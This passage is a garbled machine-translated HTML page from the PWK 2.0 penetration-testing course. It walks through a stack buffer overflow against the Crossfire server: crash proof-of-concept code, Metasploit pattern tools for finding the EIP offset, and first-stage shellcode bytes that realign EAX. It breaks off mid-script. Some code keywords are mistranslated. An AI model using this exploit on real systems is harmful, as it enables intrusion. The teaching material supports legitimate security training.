<div style="position:absolute;top:93292;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.send（缓冲区）</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s.close()</font></font></nobr></div>
<div style="position:absolute;top:93342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[*]有效载荷已发送！”</font></font></nobr></div>
<div style="position:absolute;top:93362;left:261"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 367 - 使 Crossfire 应用程序崩溃的概念代码证明</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量在其开头和结尾需要特定的十六进制值，如</font></font></nobr></div>
<div style="position:absolute;top:93411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及“设置声音”字符串，以便应用程序崩溃。</font></font></nobr></div>
<div style="position:absolute;top:93443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们最初的概念验证构建了一个恶意缓冲区，包括“设置声音”命令，</font></font></nobr></div>
<div style="position:absolute;top:93463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到端口 13327 上的远程服务，并发送缓冲区。</font></font></nobr></div>
<div style="position:absolute;top:93496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了让 Crossfire 崩溃，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行我们的第一个概念验证</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python poc_01.py</font></font></font></b></nobr></div>
<div style="position:absolute;top:93547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]发送恶意缓冲区...</font></font></nobr></div>
<div style="position:absolute;top:93564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#</font></font></nobr></div>
<div style="position:absolute;top:93581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*]有效载荷已发送！</font></font></nobr></div>
<div style="position:absolute;top:93601;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 368 - 从 Kali 运行概念验证代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行脚本后，调试器显示以下错误消息，明确指出</font></font></nobr></div>
<div style="position:absolute;top:93650;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置声音</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令中</font><font style="vertical-align: inherit;">存在内存损坏</font><font style="vertical-align: inherit;">，可能是缓冲区溢出情况：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93868;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 225：指示缓冲区溢出的崩溃</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">OK</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按钮，我们发现 EIP 寄存器已被我们的缓冲区覆盖。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:94027;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="80"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 80 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:94060;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:95137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:95137;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:95137;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">400</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:94156;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.2.1.2 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用您收到的凭据登录您的专用 Linux 客户端。</font></font></nobr></div>
<div style="position:absolute;top:94214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在您的 Kali 机器上，重新创建导致 Crossfire 服务器崩溃的概念验证代码。</font></font></nobr></div>
<div style="position:absolute;top:94243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 将调试器连接到 Crossfire 服务器，针对您的 Linux 客户端运行漏洞利用程序，然后</font></font></nobr></div>
<div style="position:absolute;top:94262;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认 EIP 寄存器被恶意缓冲区覆盖。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:94299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.3 控制EIP</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的下一个任务是确定缓冲区中的哪四个字节最终覆盖了易受攻击的函数</font></font></nobr></div>
<div style="position:absolute;top:94360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回地址以控制 EIP 寄存器。</font><font style="vertical-align: inherit;">我们将使用 Metasploit </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_create</font></font></font></b></nobr></div>
<div style="position:absolute;top:94380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建唯一缓冲区字符串的脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_create -l 4379</font></font></font></b></nobr></div>
<div style="position:absolute;top:94431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac</font></font></nobr></div>
<div style="position:absolute;top:94448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6A</font></font></nobr></div>
<div style="position:absolute;top:94465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:94485;left:261"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 369 - 使用 msf-pattern_create 创建唯一的缓冲区字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过用这个新的和独特的缓冲区交换我们的原始缓冲区，并运行概念验证</font></font></nobr></div>
<div style="position:absolute;top:94533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次编写脚本，我们使调试的应用程序崩溃，这次用以下字节覆盖 EIP：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94959;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 226：使用唯一缓冲区字符串使应用程序崩溃</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将此值传递给 Metasploit </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_offset</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本会显示以下缓冲区偏移量</font></font></nobr></div>
<div style="position:absolute;top:95010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于那些特定字节：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-pattern_offset -q 46367046</font></font></font></b></nobr></div>
<div style="position:absolute;top:95061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在偏移量 4368 处完全匹配</font></font></nobr></div>
<div style="position:absolute;top:95081;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 370 - 获取覆盖偏移量 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:95215;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="81"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 81 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:95248;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:96325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:96325;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:96325;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">401</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了确认这个偏移量，我们将更新</font><font style="vertical-align: inherit;">我们的概念验证中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量以干净地覆盖</font></font></nobr></div>
<div style="position:absolute;top:95363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有四个“B”字符的 EIP。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃 = "\x41" * 4368 + "B" * 4 + "C" * 7</font></font></nobr></div>
<div style="position:absolute;top:95417;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 371 - 控制 EIP 寄存器</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95448;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 确定覆盖堆栈上的返回地址所需的正确缓冲区偏移量。</font></font></nobr></div>
<div style="position:absolute;top:95507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 更新您的独立脚本以确保您的偏移量正确。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.4 为我们的 Shellcode 定位空间</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们必须找到在崩溃时是否有任何寄存器指向我们的缓冲区。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:95605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">step 是必不可少的，允许我们随后尝试识别可能的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JMP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CALL</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令</font></font></nobr></div>
<div style="position:absolute;top:95624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以将执行流重定向到我们的缓冲区。</font></font></nobr></div>
<div style="position:absolute;top:95657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们注意到 ESP 寄存器（图 227）指向我们缓冲区的末尾，只剩下七个字节</font></font></nobr></div>
<div style="position:absolute;top:95676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellcode 的空间。</font><font style="vertical-align: inherit;">此外，我们不能试图增加溢出缓冲区的大小</font></font></nobr></div>
<div style="position:absolute;top:95696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获得更多空间；</font><font style="vertical-align: inherit;">即使是单个字节的增加也会产生不同的崩溃</font></font></nobr></div>
<div style="position:absolute;top:95715;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖 EIP。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96231;left:192"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 227：ESP 指向我们缓冲区的末尾，只为我们的 shellcode 留下了 7 个字节的空间 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:96403;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="82"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 82 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:96436;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:97513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:97513;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:97513;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">402</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:96526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12.4.1.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仔细查看我们的寄存器在崩溃时的状态（图 227）会发现更多选项。</font></font></nobr></div>
<div style="position:absolute;top:96566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EAX 寄存器似乎指向我们缓冲区的开头，包括“设置声音”字符串。</font></font></nobr></div>
<div style="position:absolute;top:96599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EAX 直接指向命令字符串开头的事实可能会影响我们的能力</font></font></nobr></div>
<div style="position:absolute;top:96618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只需跳转到 EAX 指向的缓冲区，因为我们将执行等效的十六进制操作码</font></font></nobr></div>
<div style="position:absolute;top:96638;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的 shellcode 之前的 ASCII 字符串“setup sound”。</font><font style="vertical-align: inherit;">这很可能会破坏执行</font></font></nobr></div>
<div style="position:absolute;top:96657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径并导致我们的漏洞利用失败。</font><font style="vertical-align: inherit;">或者会吗？</font></font></nobr></div>
<div style="position:absolute;top:96690;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进一步检查由“设置声音”字符串生成的实际操作码显示</font></font></nobr></div>
<div style="position:absolute;top:96709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以下说明：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97009;left:256"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 228：“设置声音”字符串操作码生成的指令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有趣的是，似乎操作码指令</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (\x73) 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (\x65)，</font></font></nobr></div>
<div style="position:absolute;top:97059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单词“setup”，翻译成</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条件跳转</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令，似乎跳转到附近的位置</font></font></nobr></div>
<div style="position:absolute;top:97078;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的受控缓冲区中。</font><font style="vertical-align: inherit;">单词 setup 的下两个字母</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">t</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (\x74) 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">u</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (\x75) 转换为</font></font></nobr></div>
<div style="position:absolute;top:97098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条件跳转略有不同。</font><font style="vertical-align: inherit;">所有这些跳跃似乎都进入了我们的受控缓冲区，所以</font></font></nobr></div>
<div style="position:absolute;top:97117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，跳转到 EAX 实际上可能对我们有用。</font><font style="vertical-align: inherit;">然而，这不是一个优雅的解决方案，所以</font></font></nobr></div>
<div style="position:absolute;top:97137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们更加努力。</font></font></nobr></div>
<div style="position:absolute;top:97169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">继续我们的分析，看起来 ESP 寄存器指向我们唯一缓冲区的末尾</font></font></nobr></div>
<div style="position:absolute;top:97188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">崩溃的时间，但这只给了我们几个字节的 shellcode 空间来使用。</font><font style="vertical-align: inherit;">我们能试试</font></font></nobr></div>
<div style="position:absolute;top:97208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用我们必须创建第一阶段 shellcode 的有限空间。</font><font style="vertical-align: inherit;">而不是实际</font></font></nobr></div>
<div style="position:absolute;top:97227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷，例如反向 shell，此第一阶段 shellcode 将用于对齐 EAX 寄存器</font></font></nobr></div>
<div style="position:absolute;top:97247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了使它在“设置声音”字符串之后立即指向我们的缓冲区，然后跳转到该位置，</font></font></nobr></div>
<div style="position:absolute;top:97266;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许我们跳过条件跳转。</font><font style="vertical-align: inherit;">为了实现这一点，我们的第一阶段 shellcode 将</font></font></nobr></div>
<div style="position:absolute;top:97285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要将 EAX 的值增加</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (\x0C) 个字节，因为字符串“setup”中有 12 个字符</font></font></nobr></div>
<div style="position:absolute;top:97305;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">声音”。</font><font style="vertical-align: inherit;">这可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ADD</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">汇编指令完成，然后继续跳转到</font></font></nobr></div>
<div style="position:absolute;top:97324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EAX 使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JMP</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指令</font><font style="vertical-align: inherit;">指向的内存</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:97591;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="83"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 83 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:97624;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:98701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:98701;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:98701;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">403</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98035;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 229：EAX 调整所需的字节数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了为我们的指令获得正确的操作码，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-nasm_shell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序来自</font></font></nobr></div>
<div style="position:absolute;top:98085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">元破解。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf-nasm_shell</font></font></font></b></nobr></div>
<div style="position:absolute;top:98154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加 eax,12</font></font></font></b></nobr></div>
<div style="position:absolute;top:98171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000 83C00C    </font></font></nobr></div>
<div style="position:absolute;top:98171;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加 eax,byte +0xc</font></font></nobr></div>
<div style="position:absolute;top:98205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nasm &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmp eax</font></font></font></b></nobr></div>
<div style="position:absolute;top:98222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">00000000 FFE0    </font></font></nobr></div>
<div style="position:absolute;top:98222;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jmp eax</font></font></nobr></div>
<div style="position:absolute;top:98241;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 372 - 获取第一阶段的 shellcode 操作码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们来说幸运的是，这两组指令（</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\x83\xc0\x0c\xff\xe0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）只占用了 5 个字节</font></font></nobr></div>
<div style="position:absolute;top:98290;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记忆。</font><font style="vertical-align: inherit;">我们可以通过包含第一阶段的 shellcode 和重新填充来更新概念验证</font></font></nobr></div>
<div style="position:absolute;top:98309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有 NOP ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">\x90</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font><font style="vertical-align: inherit;">的原始缓冲区，</font><font style="vertical-align: inherit;">以保持正确的长度。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:98361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
<div style="position:absolute;top:98395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 = "10.11.0.128"</font></font></nobr></div>
<div style="position:absolute;top:98429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充 = "\x41" * 4368</font></font></nobr></div>
<div style="position:absolute;top:98446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "\x42\x42\x42\x42"</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:98463;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">buffer = "\x11(setup sound " + padding + eip + </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">first_stage</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> + "\x90\x00#"</font></font></nobr></div>
<div style="position:absolute;top:98531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</font></font></nobr></div>
